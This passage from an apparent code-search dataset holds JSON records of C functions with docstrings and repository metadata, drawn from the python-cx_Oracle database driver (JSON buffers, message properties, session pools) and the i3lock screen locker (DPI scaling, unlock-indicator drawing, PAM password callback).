array->elementValues = NULL;\n            }\n            break;\n        case DPI_NATIVE_TYPE_JSON_OBJECT:\n            obj = &node->value->asJsonObject;\n            if (obj->fields) {\n                for (i = 0; i < obj->numFields; i++) {\n                    if (obj->fields[i].value)\n                        cxoJsonBuffer_freeNode(&obj->fields[i]);\n                }\n                PyMem_Free(obj->fields);\n                obj->fields = NULL;\n            }\n            if (obj->fieldNames) {\n                PyMem_Free(obj->fieldNames);\n                obj->fieldNames = NULL;\n            }\n            if (obj->fieldNameLengths) {\n                PyMem_Free(obj->fieldNameLengths);\n                obj->fieldNameLengths = NULL;\n            }\n            if (obj->fieldValues) {\n                PyMem_Free(obj->fieldValues);\n                obj->fieldValues = NULL;\n            }\n            break;\n    }\n}", "path": "python-cx_Oracle/src/cxoJsonBuffer.c", "commit_date": "2020-12-08 00:00:00", "repo_name": "oracle/python-cx_Oracle", "stars": 879, "license": "other", "language": "c", "size": 7469}
{"docstring": "//-----------------------------------------------------------------------------\n// cxoMsgProps_getDeliveryMode()\n//   Get the value of the delivery mode property.\n//-----------------------------------------------------------------------------\n", "func_signal": "static PyObject *cxoMsgProps_getDeliveryMode(cxoMsgProps *props, void *unused)", "code": "{\n    dpiMessageDeliveryMode value;\n\n    if (dpiMsgProps_getDeliveryMode(props->handle, &value) < 0)\n        return cxoError_raiseAndReturnNull();\n    return PyLong_FromLong(value);\n}", "path": "python-cx_Oracle/src/cxoMsgProps.c", "commit_date": "2020-07-28 00:00:00", "repo_name": "oracle/python-cx_Oracle", "stars": 879, "license": "other", "language": "c", "size": 7469}
{"docstring": "//-----------------------------------------------------------------------------\n// cxoMsgProps_getState()\n//   Get the value of the state property.\n//-----------------------------------------------------------------------------\n", "func_signal": "static PyObject *cxoMsgProps_getState(cxoMsgProps *props, void *unused)", "code": "{\n    dpiMessageState value;\n\n    if (dpiMsgProps_getState(props->handle, &value) < 0)\n        return cxoError_raiseAndReturnNull();\n    return PyLong_FromLong(value);\n}", "path": "python-cx_Oracle/src/cxoMsgProps.c", "commit_date": "2020-07-28 00:00:00", "repo_name": "oracle/python-cx_Oracle", "stars": 879, "license": "other", "language": "c", "size": 7469}
{"docstring": "//-----------------------------------------------------------------------------\n// cxoSessionPool_release()\n//   Release a connection back to the session pool.\n//-----------------------------------------------------------------------------\n", "func_signal": "static PyObject *cxoSessionPool_release(cxoSessionPool *pool, PyObject *args,\n        PyObject *keywordArgs)", "code": "{\n    static char *keywordList[] = { \"connection\", \"tag\", NULL };\n    cxoConnection *conn;\n    cxoBuffer tagBuffer;\n    PyObject *tagObj;\n    uint32_t mode;\n    int status;\n\n    // parse arguments\n    tagObj = NULL;\n    if (!PyArg_ParseTupleAndKeywords(args, keywordArgs, \"O!|O\",\n            keywordList, &cxoPyTypeConnection, &conn, &tagObj))\n        return NULL;\n    if (!tagObj)\n        tagObj = conn->tag;\n    if (cxoBuffer_fromObject(&tagBuffer, tagObj,\n            pool->encodingInfo.encoding) < 0)\n        return NULL;\n    mode = DPI_MODE_CONN_CLOSE_DEFAULT;\n    if (tagObj && tagObj != Py_None)\n        mode |= DPI_MODE_CONN_CLOSE_RETAG;\n    Py_BEGIN_ALLOW_THREADS\n    status = dpiConn_close(conn->handle, mode, (char*) tagBuffer.ptr,\n            tagBuffer.size);\n    Py_END_ALLOW_THREADS\n    cxoBuffer_clear(&tagBuffer);\n    if (status < 0)\n        return cxoError_raiseAndReturnNull();\n\n    // mark connection as closed\n    Py_CLEAR(conn->sessionPool);\n    dpiConn_release(conn->handle);\n    conn->handle = NULL;\n    Py_RETURN_NONE;\n}", "path": "python-cx_Oracle/src/cxoSessionPool.c", "commit_date": "2020-07-28 00:00:00", "repo_name": "oracle/python-cx_Oracle", "stars": 879, "license": "other", "language": "c", "size": 7469}
{"docstring": "//-----------------------------------------------------------------------------\n// cxoSessionPool_free()\n//   Deallocate the session pool.\n//-----------------------------------------------------------------------------\n", "func_signal": "static void cxoSessionPool_free(cxoSessionPool *pool)", "code": "{\n    if (pool->handle) {\n        dpiPool_release(pool->handle);\n        pool->handle = NULL;\n    }\n    Py_CLEAR(pool->username);\n    Py_CLEAR(pool->dsn);\n    Py_CLEAR(pool->name);\n    Py_CLEAR(pool->sessionCallback);\n    Py_TYPE(pool)->tp_free((PyObject*) pool);\n}", "path": "python-cx_Oracle/src/cxoSessionPool.c", "commit_date": "2020-07-28 00:00:00", "repo_name": "oracle/python-cx_Oracle", "stars": 879, "license": "other", "language": "c", "size": 7469}
{"docstring": "//-----------------------------------------------------------------------------\n// cxoJsonBuffer_getBuffer()\n//   Acquire a new buffer from the array of buffers. If one is not available,\n// more space is allocated in chunks.\n//-----------------------------------------------------------------------------\n", "func_signal": "static int cxoJsonBuffer_getBuffer(cxoJsonBuffer *buf, cxoBuffer **buffer)", "code": "{\n    cxoBuffer *tempBuffers;\n\n    if (buf->numBuffers == buf->allocatedBuffers) {\n        buf->allocatedBuffers += 16;\n        tempBuffers = PyMem_Realloc(buf->buffers,\n                buf->allocatedBuffers * sizeof(cxoBuffer));\n        if (!tempBuffers) {\n            PyErr_NoMemory();\n            return -1;\n        }\n        buf->buffers = tempBuffers;\n    }\n    *buffer = &buf->buffers[buf->numBuffers++];\n\n    return 0;\n}", "path": "python-cx_Oracle/src/cxoJsonBuffer.c", "commit_date": "2020-12-08 00:00:00", "repo_name": "oracle/python-cx_Oracle", "stars": 879, "license": "other", "language": "c", "size": 7469}
{"docstring": "//-----------------------------------------------------------------------------\n// cxoMsgProps_new()\n//   Create a new message properties object.\n//-----------------------------------------------------------------------------\n", "func_signal": "cxoMsgProps *cxoMsgProps_new(cxoConnection *connection, dpiMsgProps *handle)", "code": "{\n    cxoMsgProps *props;\n\n    props = (cxoMsgProps*) cxoPyTypeMsgProps.tp_alloc(&cxoPyTypeMsgProps, 0);\n    if (!props) {\n        if (handle)\n            dpiMsgProps_release(handle);\n        return NULL;\n    }\n    if (!handle && dpiConn_newMsgProps(connection->handle, &handle) < 0) {\n        Py_DECREF(props);\n        cxoError_raiseAndReturnNull();\n        return NULL;\n    }\n    props->handle = handle;\n    props->encoding = connection->encodingInfo.encoding;\n\n    return props;\n}", "path": "python-cx_Oracle/src/cxoMsgProps.c", "commit_date": "2020-07-28 00:00:00", "repo_name": "oracle/python-cx_Oracle", "stars": 879, "license": "other", "language": "c", "size": 7469}
{"docstring": "//-----------------------------------------------------------------------------\n// cxoSessionPool_getAttribute()\n//   Return the value for the attribute.\n//-----------------------------------------------------------------------------\n", "func_signal": "static PyObject *cxoSessionPool_getAttribute(cxoSessionPool *pool,\n        int (*func)(dpiPool *pool, uint32_t *value))", "code": "{\n    uint32_t value;\n\n    if ((*func)(pool->handle, &value) < 0)\n        return cxoError_raiseAndReturnNull();\n    return PyLong_FromUnsignedLong(value);\n}", "path": "python-cx_Oracle/src/cxoSessionPool.c", "commit_date": "2020-07-28 00:00:00", "repo_name": "oracle/python-cx_Oracle", "stars": 879, "license": "other", "language": "c", "size": 7469}
{"docstring": "//-----------------------------------------------------------------------------\n// cxoMsgProps_setCorrelation()\n//   Set the value of the correlation property.\n//-----------------------------------------------------------------------------\n", "func_signal": "static int cxoMsgProps_setCorrelation(cxoMsgProps *props, PyObject *valueObj,\n        void *unused)", "code": "{\n    cxoBuffer buffer;\n    int status;\n\n    if (cxoBuffer_fromObject(&buffer, valueObj, props->encoding))\n        return -1;\n    status = dpiMsgProps_setCorrelation(props->handle, buffer.ptr,\n            buffer.size);\n    cxoBuffer_clear(&buffer);\n    if (status < 0)\n        return cxoError_raiseAndReturnInt();\n    return 0;\n}", "path": "python-cx_Oracle/src/cxoMsgProps.c", "commit_date": "2020-07-28 00:00:00", "repo_name": "oracle/python-cx_Oracle", "stars": 879, "license": "other", "language": "c", "size": 7469}
{"docstring": "//-----------------------------------------------------------------------------\n// cxoMsgProps_getCorrelation()\n//   Get the value of the correlation property.\n//-----------------------------------------------------------------------------\n", "func_signal": "static PyObject *cxoMsgProps_getCorrelation(cxoMsgProps *props, void *unused)", "code": "{\n    uint32_t valueLength;\n    const char *value;\n\n    if (dpiMsgProps_getCorrelation(props->handle, &value, &valueLength) < 0)\n        return cxoError_raiseAndReturnNull();\n    if (!value)\n        Py_RETURN_NONE;\n    return PyUnicode_Decode(value, valueLength, props->encoding, NULL);\n}", "path": "python-cx_Oracle/src/cxoMsgProps.c", "commit_date": "2020-07-28 00:00:00", "repo_name": "oracle/python-cx_Oracle", "stars": 879, "license": "other", "language": "c", "size": 7469}
{"docstring": "//-----------------------------------------------------------------------------\n// cxoMsgProps_setAttrInt32()\n//   Set the value of the attribute as a 32-bit integer.\n//-----------------------------------------------------------------------------\n", "func_signal": "static int cxoMsgProps_setAttrInt32(cxoMsgProps *props, PyObject *valueObj,\n        int (*func)(dpiMsgProps *props, int32_t value))", "code": "{\n    int32_t value;\n\n    value = PyLong_AsLong(valueObj);\n    if (PyErr_Occurred())\n        return -1;\n    if ((*func)(props->handle, value) < 0)\n        return cxoError_raiseAndReturnInt();\n    return 0;\n}", "path": "python-cx_Oracle/src/cxoMsgProps.c", "commit_date": "2020-07-28 00:00:00", "repo_name": "oracle/python-cx_Oracle", "stars": 879, "license": "other", "language": "c", "size": 7469}
{"docstring": "//-----------------------------------------------------------------------------\n// cxoMsgProps_getOriginalMsgId()\n//   Get the value of the expiration property.\n//-----------------------------------------------------------------------------\n", "func_signal": "static PyObject *cxoMsgProps_getOriginalMsgId(cxoMsgProps *props, void *unused)", "code": "{\n    uint32_t valueLength;\n    const char *value;\n\n    if (dpiMsgProps_getOriginalMsgId(props->handle, &value, &valueLength) < 0)\n        return cxoError_raiseAndReturnNull();\n    if (!value)\n        Py_RETURN_NONE;\n    return PyBytes_FromStringAndSize(value, valueLength);\n}", "path": "python-cx_Oracle/src/cxoMsgProps.c", "commit_date": "2020-07-28 00:00:00", "repo_name": "oracle/python-cx_Oracle", "stars": 879, "license": "other", "language": "c", "size": 7469}
{"docstring": "//-----------------------------------------------------------------------------\n// cxoSessionPool_getGetMode()\n//   Return the \"get\" mode for connections in the session pool.\n//-----------------------------------------------------------------------------\n", "func_signal": "static PyObject *cxoSessionPool_getGetMode(cxoSessionPool *pool, void *unused)", "code": "{\n    dpiPoolGetMode value;\n\n    if (dpiPool_getGetMode(pool->handle, &value) < 0)\n        return cxoError_raiseAndReturnNull();\n    return PyLong_FromLong(value);\n}", "path": "python-cx_Oracle/src/cxoSessionPool.c", "commit_date": "2020-07-28 00:00:00", "repo_name": "oracle/python-cx_Oracle", "stars": 879, "license": "other", "language": "c", "size": 7469}
{"docstring": "//-----------------------------------------------------------------------------\n// cxoJsonBuffer_populateNode()\n//   Populate a particular node with the value of the Python object.\n//-----------------------------------------------------------------------------\n", "func_signal": "static int cxoJsonBuffer_populateNode(cxoJsonBuffer *buf, dpiJsonNode *node,\n        PyObject *value)", "code": "{\n    cxoTransformNum transformNum;\n    PyObject *childValue, *key;\n    cxoBuffer *tempBuffer;\n    Py_ssize_t pos, size;\n    dpiJsonArray *array;\n    dpiJsonObject *obj;\n    char message[250];\n    uint32_t i;\n\n    // handle NULL values\n    if (value == Py_None) {\n        node->oracleTypeNum = DPI_ORACLE_TYPE_NONE;\n        node->nativeTypeNum = DPI_NATIVE_TYPE_NULL;\n        return 0;\n    }\n\n    // handle arrays\n    if (PyList_Check(value)) {\n\n        // initialize array\n        node->oracleTypeNum = DPI_ORACLE_TYPE_JSON_ARRAY;\n        node->nativeTypeNum = DPI_NATIVE_TYPE_JSON_ARRAY;\n        array = &node->value->asJsonArray;\n        array->numElements = (uint32_t) PyList_GET_SIZE(value);\n        array->elements = PyMem_Calloc(array->numElements,\n                sizeof(dpiJsonNode));\n        array->elementValues = PyMem_Calloc(array->numElements,\n                sizeof(dpiDataBuffer));\n        if (!array->elements || !array->elementValues) {\n            PyErr_NoMemory();\n            return -1;\n        }\n\n        // process each element of the array\n        for (i = 0; i < array->numElements; i++) {\n            childValue = PyList_GET_ITEM(value, i);\n            array->elements[i].value = &array->elementValues[i];\n            if (cxoJsonBuffer_populateNode(buf, &array->elements[i],\n                    childValue) < 0)\n                return -1;\n        }\n\n        return 0;\n    }\n\n    // handle dictionaries\n    if (PyDict_Check(value)) {\n\n        // initialize object\n        node->oracleTypeNum = DPI_ORACLE_TYPE_JSON_OBJECT;\n        node->nativeTypeNum = DPI_NATIVE_TYPE_JSON_OBJECT;\n        obj = &node->value->asJsonObject;\n        size = PyDict_Size(value);\n        if (size < 0)\n            return -1;\n        obj->numFields = (uint32_t) size;\n        obj->fieldNames = PyMem_Calloc(obj->numFields, sizeof(char*));\n        obj->fieldNameLengths = PyMem_Calloc(obj->numFields, sizeof(uint32_t));\n        obj->fields = PyMem_Calloc(obj->numFields, sizeof(dpiJsonNode));\n        obj->fieldValues = PyMem_Calloc(obj->numFields,\n                sizeof(dpiDataBuffer));\n        if (!obj->fieldNames || !obj->fieldNameLengths || !obj->fields ||\n                !obj->fieldValues) {\n            PyErr_NoMemory();\n            return -1;\n        }\n\n        // process each entry in the dictionary\n        i = 0;\n        pos = 0;\n        while (PyDict_Next(value, &pos, &key, &childValue)) {\n            if (cxoJsonBuffer_getBuffer(buf, &tempBuffer) < 0)\n                return -1;\n            if (cxoBuffer_fromObject(tempBuffer, key, CXO_JSON_ENCODING) < 0)\n                return -1;\n            obj->fields[i].value = &obj->fieldValues[i];\n            obj->fieldNames[i] = (char*) tempBuffer->ptr;\n            obj->fieldNameLengths[i] = tempBuffer->size;\n            if (cxoJsonBuffer_populateNode(buf, &obj->fields[i],\n                    childValue) < 0)\n                return -1;\n            i++;\n        }\n\n        return 0;\n    }\n\n    // handle scalar values\n    tempBuffer = NULL;\n    transformNum = cxoTransform_getNumFromPythonValue(value, 1);\n    switch (transformNum) {\n\n        // strings and bytes must have a buffer made available for them to\n        // store a reference to the object and the actual pointer and length;\n        // numbers are converted to a string in order to prevent precision loss\n        case CXO_TRANSFORM_STRING:\n        case CXO_TRANSFORM_BINARY:\n        case CXO_TRANSFORM_INT:\n        case CXO_TRANSFORM_FLOAT:\n        case CXO_TRANSFORM_DECIMAL:\n            if (cxoJsonBuffer_getBuffer(buf, &tempBuffer) < 0)\n                return -1;\n            break;\n\n        // swap CXO_TRANSFORM_DATETIME to CXO_TRANSFORM_TIMESTAMP to preserve\n        // fractional seconds\n        case CXO_TRANSFORM_DATETIME:\n            transformNum = CXO_TRANSFORM_TIMESTAMP;\n            break;\n\n        // all other types do not need any special processing\n        case CXO_TRANSFORM_BOOLEAN:\n        case CXO_TRANSFORM_DATE:\n        case CXO_TRANSFORM_TIMEDELTA:\n            break;\n\n        // any other type is not currently supported\n        default:\n            snprintf(message, sizeof(message), \"Python type %s not supported.\",\n                    Py_TYPE(value)->tp_name);\n            cxoError_raiseFromString(cxoNotSupportedErrorException, message);\n            return -1;\n    }\n\n    // transform the Python value into the Oracle value\n    cxoTransform_getTypeInfo(transformNum, &node->oracleTypeNum,\n            &node->nativeTypeNum);\n    if (cxoTransform_fromPython(transformNum, &node->nativeTypeNum, value,\n            node->value, tempBuffer, CXO_JSON_ENCODING, CXO_JSON_ENCODING,\n            NULL, 0) < 0)\n        return -1;\n\n    return 0;\n}", "path": "python-cx_Oracle/src/cxoJsonBuffer.c", "commit_date": "2020-12-08 00:00:00", "repo_name": "oracle/python-cx_Oracle", "stars": 879, "license": "other", "language": "c", "size": 7469}
{"docstring": "//-----------------------------------------------------------------------------\n// cxoSessionPool_acquire()\n//   Create a new connection within the session pool.\n//-----------------------------------------------------------------------------\n", "func_signal": "static PyObject *cxoSessionPool_acquire(cxoSessionPool *pool, PyObject *args,\n        PyObject *keywordArgs)", "code": "{\n    static char *keywordList[] = { \"user\", \"password\", \"cclass\", \"purity\",\n            \"tag\", \"matchanytag\", \"shardingkey\", \"supershardingkey\", NULL };\n    PyObject *createKeywordArgs, *result, *cclassObj, *purityObj, *tagObj;\n    PyObject *shardingKeyObj, *superShardingKeyObj;\n    Py_ssize_t usernameLength, passwordLength;\n    char *username, *password;\n    PyObject *matchAnyTagObj;\n\n    // parse arguments\n    if (!PyArg_ParseTupleAndKeywords(args, keywordArgs, \"|s#s#OOOOOO\",\n            keywordList, &username, &usernameLength, &password,\n            &passwordLength, &cclassObj, &purityObj, &tagObj, &matchAnyTagObj,\n            &shardingKeyObj, &superShardingKeyObj))\n        return NULL;\n\n    // create arguments\n    if (keywordArgs)\n        createKeywordArgs = PyDict_Copy(keywordArgs);\n    else createKeywordArgs = PyDict_New();\n    if (!createKeywordArgs)\n        return NULL;\n    if (PyDict_SetItemString(createKeywordArgs, \"pool\",\n            (PyObject*) pool) < 0) {\n        Py_DECREF(createKeywordArgs);\n        return NULL;\n    }\n\n    // create the connection object\n    result = PyObject_Call( (PyObject*) pool->connectionType, args,\n            createKeywordArgs);\n    Py_DECREF(createKeywordArgs);\n\n    return result;\n}", "path": "python-cx_Oracle/src/cxoSessionPool.c", "commit_date": "2020-07-28 00:00:00", "repo_name": "oracle/python-cx_Oracle", "stars": 879, "license": "other", "language": "c", "size": 7469}
{"docstring": "//-----------------------------------------------------------------------------\n// cxoMsgProps_getExceptionQ()\n//   Get the value of the exception queue property.\n//-----------------------------------------------------------------------------\n", "func_signal": "static PyObject *cxoMsgProps_getExceptionQ(cxoMsgProps *props, void *unused)", "code": "{\n    uint32_t valueLength;\n    const char *value;\n\n    if (dpiMsgProps_getExceptionQ(props->handle, &value, &valueLength) < 0)\n        return cxoError_raiseAndReturnNull();\n    if (!value)\n        Py_RETURN_NONE;\n    return PyUnicode_Decode(value, valueLength, props->encoding, NULL);\n}", "path": "python-cx_Oracle/src/cxoMsgProps.c", "commit_date": "2020-07-28 00:00:00", "repo_name": "oracle/python-cx_Oracle", "stars": 879, "license": "other", "language": "c", "size": 7469}
{"docstring": "//-----------------------------------------------------------------------------\n// cxoSessionPool_close()\n//   Close the session pool and make it unusable.\n//-----------------------------------------------------------------------------\n", "func_signal": "static PyObject *cxoSessionPool_close(cxoSessionPool *pool, PyObject *args,\n        PyObject *keywordArgs)", "code": "{\n    static char *keywordList[] = { \"force\", NULL };\n    PyObject *forceObj;\n    uint32_t closeMode;\n    int temp, status;\n\n    // parse arguments\n    forceObj = NULL;\n    if (!PyArg_ParseTupleAndKeywords(args, keywordArgs, \"|O\", keywordList,\n            &forceObj))\n        return NULL;\n    if (cxoUtils_getBooleanValue(forceObj, 0, &temp) < 0)\n        return NULL;\n    closeMode = (temp) ? DPI_MODE_POOL_CLOSE_FORCE :\n            DPI_MODE_POOL_CLOSE_DEFAULT;\n\n    // close pool\n    Py_BEGIN_ALLOW_THREADS\n    status = dpiPool_close(pool->handle, closeMode);\n    Py_END_ALLOW_THREADS\n    if (status < 0)\n        return cxoError_raiseAndReturnNull();\n\n    Py_RETURN_NONE;\n}", "path": "python-cx_Oracle/src/cxoSessionPool.c", "commit_date": "2020-07-28 00:00:00", "repo_name": "oracle/python-cx_Oracle", "stars": 879, "license": "other", "language": "c", "size": 7469}
{"docstring": "//-----------------------------------------------------------------------------\n// cxoMsgProps_free()\n//   Free the memory associated with the message properties object.\n//-----------------------------------------------------------------------------\n", "func_signal": "static void cxoMsgProps_free(cxoMsgProps *props)", "code": "{\n    if (props->handle) {\n        dpiMsgProps_release(props->handle);\n        props->handle = NULL;\n    }\n    Py_CLEAR(props->payload);\n    Py_TYPE(props)->tp_free((PyObject*) props);\n}", "path": "python-cx_Oracle/src/cxoMsgProps.c", "commit_date": "2020-07-28 00:00:00", "repo_name": "oracle/python-cx_Oracle", "stars": 879, "license": "other", "language": "c", "size": 7469}
{"docstring": "//-----------------------------------------------------------------------------\n// cxoSessionPool_setMaxLifetimeSession()\n//   Set the maximum lifetime for connections in the session pool.\n//-----------------------------------------------------------------------------\n", "func_signal": "static int cxoSessionPool_setMaxLifetimeSession(cxoSessionPool *pool,\n        PyObject *value, void *unused)", "code": "{\n    return cxoSessionPool_setAttribute(pool, value,\n            dpiPool_setMaxLifetimeSession);\n}", "path": "python-cx_Oracle/src/cxoSessionPool.c", "commit_date": "2020-07-28 00:00:00", "repo_name": "oracle/python-cx_Oracle", "stars": 879, "license": "other", "language": "c", "size": 7469}
{"docstring": "//-----------------------------------------------------------------------------\n// cxoJsonBuffer_fromObject()\n//   Populate the JSON buffer from a Python object.\n//-----------------------------------------------------------------------------\n", "func_signal": "int cxoJsonBuffer_fromObject(cxoJsonBuffer *buf, PyObject *obj)", "code": "{\n    // initialize JSON buffer structure\n    buf->topNode.value = &buf->topNodeBuffer;\n    buf->allocatedBuffers = 0;\n    buf->numBuffers = 0;\n    buf->buffers = NULL;\n\n    // populate the top level node\n    return cxoJsonBuffer_populateNode(buf, &buf->topNode, obj);\n}", "path": "python-cx_Oracle/src/cxoJsonBuffer.c", "commit_date": "2020-12-08 00:00:00", "repo_name": "oracle/python-cx_Oracle", "stars": 879, "license": "other", "language": "c", "size": 7469}
{"docstring": "/*\n * Convert a logical amount of pixels (e.g. 2 pixels on a \u201cstandard\u201d 96 DPI\n * screen) to a corresponding amount of physical pixels on a standard or retina\n * screen, e.g. 5 pixels on a 227 DPI MacBook Pro 13\" Retina screen.\n *\n */\n", "func_signal": "int logical_px(const int logical)", "code": "{\n    if (screen == NULL) {\n        /* Dpi info may not be available when parsing a config without an X\n         * server, such as for config file validation. */\n        return logical;\n    }\n\n    /* There are many misconfigurations out there, i.e. systems with screens\n     * whose dpi is in fact higher than 96 dpi, but not significantly higher,\n     * so software was never adapted. We could tell people to reconfigure their\n     * systems to 96 dpi in order to get the behavior they expect/are used to,\n     * but since we can easily detect this case in code, let\u2019s do it for them.\n     */\n    if ((dpi / 96.0) < 1.25)\n        return logical;\n    return ceil((dpi / 96.0) * logical);\n}", "path": "i3lock/dpi.c", "commit_date": "2018-05-11 00:00:00", "repo_name": "i3/i3lock", "stars": 872, "license": "bsd-3-clause", "language": "c", "size": 407}
{"docstring": "/*\n * Hides the unlock indicator completely when there is no content in the\n * password buffer.\n *\n */\n", "func_signal": "void clear_indicator(void)", "code": "{\n    if (input_position == 0) {\n        unlock_state = STATE_STARTED;\n    } else\n        unlock_state = STATE_KEY_PRESSED;\n    redraw_screen();\n}", "path": "i3lock/unlock_indicator.c", "commit_date": "2020-07-05 00:00:00", "repo_name": "i3/i3lock", "stars": 872, "license": "bsd-3-clause", "language": "c", "size": 407}
{"docstring": "/*\n * Releases the current background pixmap so that the next redraw_screen() call\n * will allocate a new one with the updated resolution.\n *\n */\n", "func_signal": "void free_bg_pixmap(void)", "code": "{\n    xcb_free_pixmap(conn, bg_pixmap);\n    bg_pixmap = XCB_NONE;\n}", "path": "i3lock/unlock_indicator.c", "commit_date": "2020-07-05 00:00:00", "repo_name": "i3/i3lock", "stars": 872, "license": "bsd-3-clause", "language": "c", "size": 407}
{"docstring": "/*\n * Callback function for PAM. We only react on password request callbacks.\n *\n */\n", "func_signal": "static int conv_callback(int num_msg, const struct pam_message **msg,\n                         struct pam_response **resp, void *appdata_ptr)", "code": "{\n    if (num_msg == 0)\n        return 1;\n\n    /* PAM expects an array of responses, one for each message */\n    if ((*resp = calloc(num_msg, sizeof(struct pam_response))) == NULL) {\n        perror(\"calloc\");\n        return 1;\n    }\n\n    for (int c = 0; c < num_msg; c++) {\n        if (msg[c]->msg_style != PAM_PROMPT_ECHO_OFF &&\n            msg[c]->msg_style != PAM_PROMPT_ECHO_ON)\n            continue;\n\n        /* return code is currently not used but should be set to zero */\n        resp[c]->resp_retcode = 0;\n        if ((resp[c]->resp = strdup(password)) == NULL) {\n            perror(\"strdup\");\n            return 1;\n        }\n    }\n\n    return 0;\n}", "path": "i3lock/i3lock.c", "commit_date": "2020-10-02 00:00:00", "repo_name": "i3/i3lock", "stars": 872, "license": "bsd-3-clause", "language": "c", "size": 407}
{"docstring": "/*\n * Resets auth_state to STATE_AUTH_IDLE 2 seconds after an unsuccessful\n * authentication event.\n *\n */\n", "func_signal": "static void clear_auth_wrong(EV_P_ ev_timer *w, int revents)", "code": "{\n    DEBUG(\"clearing auth wrong\\n\");\n    auth_state = STATE_AUTH_IDLE;\n    redraw_screen();\n\n    /* Clear modifier string. */\n    if (modifier_string != NULL) {\n        free(modifier_string);\n        modifier_string = NULL;\n    }\n\n    /* Now free this timeout. */\n    STOP_TIMER(clear_auth_wrong_timeout);\n\n    /* retry with input done during auth verification */\n    if (retry_verification) {\n        retry_verification = false;\n        finish_input();\n    }\n}", "path": "i3lock/i3lock.c", "commit_date": "2020-10-02 00:00:00", "repo_name": "i3/i3lock", "stars": 872, "license": "bsd-3-clause", "language": "c", "size": 407}
{"docstring": "/*\n * Draws global image with fill color onto a pixmap with the given\n * resolution and returns it.\n *\n */\n", "func_signal": "void draw_image(xcb_pixmap_t bg_pixmap, uint32_t *resolution)", "code": "{\n    const double scaling_factor = get_dpi_value() / 96.0;\n    int button_diameter_physical = ceil(scaling_factor * BUTTON_DIAMETER);\n    DEBUG(\"scaling_factor is %.f, physical diameter is %d px\\n\",\n          scaling_factor, button_diameter_physical);\n\n    if (!vistype)\n        vistype = get_root_visual_type(screen);\n\n    /* Initialize cairo: Create one in-memory surface to render the unlock\n     * indicator on, create one XCB surface to actually draw (one or more,\n     * depending on the amount of screens) unlock indicators on. */\n    cairo_surface_t *output = cairo_image_surface_create(CAIRO_FORMAT_ARGB32, button_diameter_physical, button_diameter_physical);\n    cairo_t *ctx = cairo_create(output);\n\n    cairo_surface_t *xcb_output = cairo_xcb_surface_create(conn, bg_pixmap, vistype, resolution[0], resolution[1]);\n    cairo_t *xcb_ctx = cairo_create(xcb_output);\n\n    /* After the first iteration, the pixmap will still contain the previous\n     * contents. Explicitly clear the entire pixmap with the background color\n     * first to get back into a defined state: */\n    char strgroups[3][3] = {{color[0], color[1], '\\0'},\n                            {color[2], color[3], '\\0'},\n                            {color[4], color[5], '\\0'}};\n    uint32_t rgb16[3] = {(strtol(strgroups[0], NULL, 16)),\n                         (strtol(strgroups[1], NULL, 16)),\n                         (strtol(strgroups[2], NULL, 16))};\n    cairo_set_source_rgb(xcb_ctx, rgb16[0] / 255.0, rgb16[1] / 255.0, rgb16[2] / 255.0);\n    cairo_rectangle(xcb_ctx, 0, 0, resolution[0], resolution[1]);\n    cairo_fill(xcb_ctx);\n\n    if (img) {\n        if (!tile) {\n            cairo_set_source_surface(xcb_ctx, img, 0, 0);\n            cairo_paint(xcb_ctx);\n        } else {\n            /* create a pattern and fill a rectangle as big as the screen */\n            cairo_pattern_t *pattern;\n            pattern = cairo_pattern_create_for_surface(img);\n            cairo_set_source(xcb_ctx, pattern);\n            cairo_pattern_set_extend(pattern, CAIRO_EXTEND_REPEAT);\n            cairo_rectangle(xcb_ctx, 0, 0, resolution[0], resolution[1]);\n            cairo_fill(xcb_ctx);\n            cairo_pattern_destroy(pattern);\n        }\n    }\n\n    if (unlock_indicator &&\n        (unlock_state >= STATE_KEY_PRESSED || auth_state > STATE_AUTH_IDLE)) {\n        cairo_scale(ctx, scaling_factor, scaling_factor);\n        /* Draw a (centered) circle with transparent background. */\n        cairo_set_line_width(ctx, 10.0);\n        cairo_arc(ctx,\n                  BUTTON_CENTER /* x */,\n                  BUTTON_CENTER /* y */,\n                  BUTTON_RADIUS /* radius */,\n                  0 /* start */,\n                  2 * M_PI /* end */);\n\n        /* Use the appropriate color for the different PAM states\n         * (currently verifying, wrong password, or default) */\n        switch (auth_state) {\n            case STATE_AUTH_VERIFY:\n            case STATE_AUTH_LOCK:\n                cairo_set_source_rgba(ctx, 0, 114.0 / 255, 255.0 / 255, 0.75);\n                break;\n            case STATE_AUTH_WRONG:\n            case STATE_I3LOCK_LOCK_FAILED:\n                cairo_set_source_rgba(ctx, 250.0 / 255, 0, 0, 0.75);\n                break;\n            default:\n                if (unlock_state == STATE_NOTHING_TO_DELETE) {\n                    cairo_set_source_rgba(ctx, 250.0 / 255, 0, 0, 0.75);\n                    break;\n                }\n                cairo_set_source_rgba(ctx, 0, 0, 0, 0.75);\n                break;\n        }\n        cairo_fill_preserve(ctx);\n\n        switch (auth_state) {\n            case STATE_AUTH_VERIFY:\n            case STATE_AUTH_LOCK:\n                cairo_set_source_rgb(ctx, 51.0 / 255, 0, 250.0 / 255);\n                break;\n            case STATE_AUTH_WRONG:\n            case STATE_I3LOCK_LOCK_FAILED:\n                cairo_set_source_rgb(ctx, 125.0 / 255, 51.0 / 255, 0);\n                break;\n            case STATE_AUTH_IDLE:\n                if (unlock_state == STATE_NOTHING_TO_DELETE) {\n                    cairo_set_source_rgb(ctx, 125.0 / 255, 51.0 / 255, 0);\n                    break;\n                }\n\n                cairo_set_source_rgb(ctx, 51.0 / 255, 125.0 / 255, 0);\n                break;\n        }\n        cairo_stroke(ctx);\n\n        /* Draw an inner seperator line. */\n        cairo_set_source_rgb(ctx, 0, 0, 0);\n        cairo_set_line_width(ctx, 2.0);\n        cairo_arc(ctx,\n                  BUTTON_CENTER /* x */,\n                  BUTTON_CENTER /* y */,\n                  BUTTON_RADIUS - 5 /* radius */,\n                  0,\n                  2 * M_PI);\n        cairo_stroke(ctx);\n\n        cairo_set_line_width(ctx, 10.0);\n\n        /* Display a (centered) text of the current PAM state. */\n        char *text = NULL;\n        /* We don't want to show more than a 3-digit number. */\n        char buf[4];\n\n        cairo_set_source_rgb(ctx, 0, 0, 0);\n        cairo_select_font_face(ctx, \"sans-serif\", CAIRO_FONT_SLANT_NORMAL, CAIRO_FONT_WEIGHT_NORMAL);\n        cairo_set_font_size(ctx, 28.0);\n        switch (auth_state) {\n            case STATE_AUTH_VERIFY:\n                text = \"Verifying\u2026\";\n                break;\n            case STATE_AUTH_LOCK:\n                text = \"Locking\u2026\";\n                break;\n            case STATE_AUTH_WRONG:\n                text = \"Wrong!\";\n                break;\n            case 